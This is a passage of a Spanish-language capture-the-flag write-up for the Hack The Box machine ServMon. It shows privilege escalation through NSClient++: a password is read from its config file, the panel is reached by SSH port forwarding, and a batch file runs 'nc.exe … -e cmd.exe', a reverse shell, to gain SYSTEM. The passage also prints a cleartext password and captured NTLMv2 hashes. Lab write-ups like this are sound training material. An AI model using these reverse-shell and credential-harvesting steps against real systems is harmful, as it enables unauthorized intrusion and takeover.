-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nadine@SERVMON C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\N&lt;/span&gt;adine&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt;whoami /priv
-
-PRIVILEGES INFORMATION
-&lt;span class=&quot;nt&quot;&gt;----------------------&lt;/span&gt;
-
-Privilege Name                Description                          State
-&lt;span class=&quot;o&quot;&gt;=============================&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;====================================&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=======&lt;/span&gt;
-SeShutdownPrivilege           Shut down the system                 Enabled
-SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
-SeUndockPrivilege             Remove computer from docking station Enabled
-SeIncreaseWorkingSetPrivilege Increase a process working &lt;span class=&quot;nb&quot;&gt;set       &lt;/span&gt;Enabled
-SeTimeZonePrivilege           Change the &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;zone                 Enabled
-
-nadine@SERVMON C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\N&lt;/span&gt;adine&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt;
-nadine@SERVMON C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\N&lt;/span&gt;adine&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt;whoami /all
-
-USER INFORMATION
-&lt;span class=&quot;nt&quot;&gt;----------------&lt;/span&gt;
-
-User Name      SID
-&lt;span class=&quot;o&quot;&gt;==============&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=============================================&lt;/span&gt;
-servmon&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;adine S-1-5-21-3877449121-2587550681-992675040-1002
-
-
-GROUP INFORMATION
-&lt;span class=&quot;nt&quot;&gt;-----------------&lt;/span&gt;
-
-Group Name                             Type             SID          Attributes
-&lt;span class=&quot;o&quot;&gt;======================================&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;================&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;============&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==================================================&lt;/span&gt;
-Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
-BUILTIN&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY&lt;span class=&quot;se&quot;&gt;\N&lt;/span&gt;ETWORK                   Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;uthenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;his Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY&lt;span class=&quot;se&quot;&gt;\L&lt;/span&gt;ocal account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY&lt;span class=&quot;se&quot;&gt;\N&lt;/span&gt;TLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
-Mandatory Label&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;edium Mandatory Level Label            S-1-16-8192
-
-
-PRIVILEGES INFORMATION
-&lt;span class=&quot;nt&quot;&gt;----------------------&lt;/span&gt;
-
-Privilege Name                Description                          State
-&lt;span class=&quot;o&quot;&gt;=============================&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;====================================&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=======&lt;/span&gt;
-SeShutdownPrivilege           Shut down the system                 Enabled
-SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
-SeUndockPrivilege             Remove computer from docking station Enabled
-SeIncreaseWorkingSetPrivilege Increase a process working &lt;span class=&quot;nb&quot;&gt;set       &lt;/span&gt;Enabled
-SeTimeZonePrivilege           Change the &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;zone                 Enabled
-
-
-nadine@SERVMON C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\N&lt;/span&gt;adine&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;No vemos nada interesante; sin embargo, debemos recordar que existe el puerto 8443 abierto haciendo mención del servicio &lt;strong&gt;NSClient++&lt;/strong&gt;, asi que podríamos echarle un ojo si existe un exploit público.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ searchsploit NSClient
-&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
- Exploit Title                                                                                 |  Path
-&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
-NSClient++ 0.5.2.35 - Authenticated Remote Code Execution                                      | json/webapps/48360.txt
-NSClient++ 0.5.2.35 - Privilege Escalation                                                     | windows/local/46802.txt
-&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
-Shellcodes: No Results
-Papers: No Results
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Tenemos dos recursos, uno de &lt;strong&gt;&lt;em&gt;Authenticated Remote Code Execution&lt;/em&gt;&lt;/strong&gt; y otro de &lt;strong&gt;&lt;em&gt;Privilege Escalation&lt;/em&gt;&lt;/strong&gt;, vamos a probar de momento el segundo a ver que nos dice que debemos hacer.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Nos indica que en la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;c:\program files\nsclient++\nsclient.ini&lt;/code&gt; podemos identificar una contraseña de administrador del servicio.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nadine@SERVMON C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\N&lt;/span&gt;adine&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt;type &lt;span class=&quot;s2&quot;&gt;&quot;c:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\p&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;rogram files&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;sclient++&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;sclient.ini&quot;&lt;/span&gt; | findstr password
-password &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ew2x6SsGTxjRwXOT
-
-nadine@SERVMON C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\N&lt;/span&gt;adine&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Sin embargo, al logearnos, nos indica un &lt;strong&gt;&lt;em&gt;403 Your not allowed&lt;/em&gt;&lt;/strong&gt;.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-servmon/servmon-web2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Esto se debe a que si vemos el archivo de configuración del servicio, indica que el único host permitido es la misma máquina víctima (127.0.0.1).&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nadine@SERVMON C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\N&lt;/span&gt;adine&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&amp;gt;type &lt;span class=&quot;s2&quot;&gt;&quot;c:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\p&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;rogram files&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;sclient++&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;sclient.ini&quot;&lt;/span&gt;
-´╗┐# If you want to fill this file with all available options run the following &lt;span class=&quot;nb&quot;&gt;command&lt;/span&gt;:
-&lt;span class=&quot;c&quot;&gt;#   nscp settings --generate --add-defaults --load-all&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# If you want to activate a module and bring in all its options use:&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;#   nscp settings --activate-module &amp;lt;MODULE NAME&amp;gt; --add-defaults &lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# For details run: nscp settings --help&lt;/span&gt;
-                                                                
-                                
-&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;flight - TODO
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;/settings/default]                                                                                                              
-                                
-&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Undocumented key
-password &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ew2x6SsGTxjRwXOT                                                                                                      
-                                
-&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Undocumented key
-allowed hosts &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 127.0.0.1
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Por lo tanto, vamos a hace un &lt;strong&gt;&lt;em&gt;Local Port Forwarding&lt;/em&gt;&lt;/strong&gt; para tener acceso desde nuestra máquina pero como si lo hicieramos desde la máquina víctima.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ssh &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; 8443:127.0.0.1:8443 nadine@10.10.10.184
-nadine@10.10.10.184&lt;span class=&quot;s1&quot;&gt;'s password:
-
-Microsoft Windows [Version 10.0.18363.752]
-(c) 2019 Microsoft Corporation. All rights reserved.
-
-nadine@SERVMON C:\Users\Nadine&amp;gt;
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ lsof &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt;:8443
-COMMAND    PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
-ssh     307287 root    4u  IPv6 920432      0t0  TCP localhost:8443 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;LISTEN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-ssh     307287 root    5u  IPv4 920433      0t0  TCP localhost:8443 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;LISTEN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Ahora si podemos ver el servicio apuntando a nuestra máquina.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-servmon/servmon-web3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;De acuerdo con el exploit, debemos habilitar los módulos &lt;strong&gt;CheckExternalScripts&lt;/strong&gt; y  &lt;strong&gt;Scheduler&lt;/strong&gt;.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-servmon/servmon-web4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-servmon/servmon-web5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Debemos crear un script bajo &lt;strong&gt;Settings &amp;gt; External Scripts &amp;gt; Scripts&lt;/strong&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-servmon/servmon-web6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Vamos a transferior el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc.exe&lt;/code&gt; y necesitamos crear un archivo de extensión bat que contenga lo siguiente. Ambos archivos los pondremos en la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\Temp\&lt;/code&gt;:&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;div class=&quot;language-bat highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;@echo &lt;span class=&quot;na&quot;&gt;off&lt;/span&gt;
-&lt;span class=&quot;kd&quot;&gt;C&lt;/span&gt;:\Temp\nc.exe &lt;span class=&quot;m&quot;&gt;10&lt;/span&gt;.10.14.27 &lt;span class=&quot;m&quot;&gt;443&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;-e &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cmd.exe&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nadine@SERVMON C:&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&amp;gt;copy &lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;10.10.14.27&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;mbFolder&lt;span class=&quot;se&quot;&gt;\p&lt;/span&gt;rivesc.bat privesc.bat
-        1 file&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; copied.
-
-nadine@SERVMON C:&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&amp;gt;copy &lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;10.10.14.27&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;mbFolder&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;c.exe nc.exe
-        1 file&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; copied.
-
-nadine@SERVMON C:&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&amp;gt;
-nadine@SERVMON C:&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&amp;gt;dir
- Volume &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;drive C has no label.
- Volume Serial Number is DC93-6115
-
- Directory of C:&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp
-
-16/01/2022  06:05    &amp;lt;DIR&amp;gt;          &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-16/01/2022  06:05    &amp;lt;DIR&amp;gt;          ..
-16/01/2022  05:05            28,160 nc.exe
-16/01/2022  04:29                52 privesc.bat
-               2 File&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;         28,212 bytes
-               2 Dir&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;   6,099,292,160 bytes free
-
-nadine@SERVMON C:&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ impacket-smbserver smbFolder &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;pwd&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-smb2support&lt;/span&gt;
-Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation        
-                                                                
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Config file parsed                                          
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Callback added &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0                                                           &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Callback added &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0                                                           &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Config file parsed                                                                                                           &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Config file parsed                                                                                                           &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Config file parsed                                          
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Incoming connection &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.184,50180&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; AUTHENTICATE_MESSAGE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SERVMON&lt;span class=&quot;se&quot;&gt;\N&lt;/span&gt;adine,SERVMON&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; User SERVMON&lt;span class=&quot;se&quot;&gt;\N&lt;/span&gt;adine authenticated successfully              
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Nadine::SERVMON:aaaaaaaaaaaaaaaa:30aec89c753a12e5d36db95e3b3de36c:010100000000000000ec4c74960ad8014d9f3943568f061d00000000010
-010007100730061004a006d00520049004800030010007100730061004a006d0052004900480002001000510043004f0064005700740065004d00040010005100
-43004f0064005700740065004d000700080000ec4c74960ad801060004000200000008003000300000000000000000000000002000002ebc1373f115123d9554b
-6b1f9118ac29ed1499e8690c0db0419656f943f50730a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030
-002e00310034002e00320037000000000000000000  
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Connecting Share&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1:IPC&lt;span class=&quot;nv&quot;&gt;$)&lt;/span&gt;                                    
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Connecting Share&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2:smbFolder&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;   
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Disconnecting Share&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1:IPC&lt;span class=&quot;nv&quot;&gt;$)&lt;/span&gt;                                 
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Disconnecting Share&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2:smbFolder&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                            
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Closing down connection &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.184,50180&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Remaining connections &lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;                                    
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Incoming connection &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.184,50197&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                    
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; AUTHENTICATE_MESSAGE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SERVMON&lt;span class=&quot;se&quot;&gt;\N&lt;/span&gt;adine,SERVMON&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; User SERVMON&lt;span class=&quot;se&quot;&gt;\N&lt;/span&gt;adine authenticated successfully
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Nadine::SERVMON:aaaaaaaaaaaaaaaa:de5c42e3a755709d52bd91fd227ed271:01010000000000008006bd8c960ad8017de9e43c87de19b600000000010
-010007100730061004a006d00520049004800030010007100730061004a006d0052004900480002001000510043004f0064005700740065004d00040010005100
-43004f0064005700740065004d00070008008006bd8c960ad801060004000200000008003000300000000000000000000000002000002ebc1373f115123d9554b
-6b1f9118ac29ed1499e8690c0db0419656f943f50730a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030
-002e00310034002e00320037000000000000000000
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Connecting Share&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1:smbFolder&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;   
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; AUTHENTICATE_MESSAGE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\,&lt;/span&gt;SERVMON&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Ahora creamos hacemos click en &lt;strong&gt;Control &amp;gt; Reload&lt;/strong&gt; y esperamos a que se restablezca el servicio.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-servmon/servmon-web7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Nos ponemos en escucha por el puerto 443 y dentro del panel de &lt;strong&gt;NSClient++&lt;/strong&gt; nos vamos a &lt;strong&gt;Queries&lt;/strong&gt; y ya debemos tener nuestra reverse shell, en caso contrario, seleccioanamos nuestro script y le damos en &lt;strong&gt;Run&lt;/strong&gt;.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-servmon/servmon-web8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ rlwrap nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
-listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
-connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.27] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.184] 49926
-Microsoft Windows &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Version 10.0.18363.752]
-&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2019 Microsoft Corporation. All rights reserved.
-
-&lt;span class=&quot;nb&quot;&gt;whoami
-whoami
-&lt;/span&gt;nt authority&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem
-
-C:&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;rogram Files&lt;span class=&quot;se&quot;&gt;\N&lt;/span&gt;SClient++&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ya estamos dentro de la máquina como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nt authority\system&lt;/code&gt; y podemos visualizar la flag (root.txt).&lt;/p&gt;
-
-&lt;p&gt;Probando el otro exploit que encontramos, nos dice que es un script en python3; por lo tanto lo descargamos en nuestra máquina.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ searchsploit &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; json/webapps/48360.txt
-  Exploit: NSClient++ 0.5.2.35 - Authenticated Remote Code Execution
-      URL: https://www.exploit-db.com/exploits/48360
-     Path: /usr/share/exploitdb/exploits/json/webapps/48360.txt
-File Type: Python script, ASCII text executable
-
-Copied to: /home/k4miyo/Documentos/HTB/ServMon/exploits/48360.txt
-
-
-❯ &lt;span class=&quot;nb&quot;&gt;mv &lt;/span&gt;48360.txt nsclient.py
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ahora si lo ejecutamos, vemos que nos pide algunos parámetros.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ python3 nsclient.py
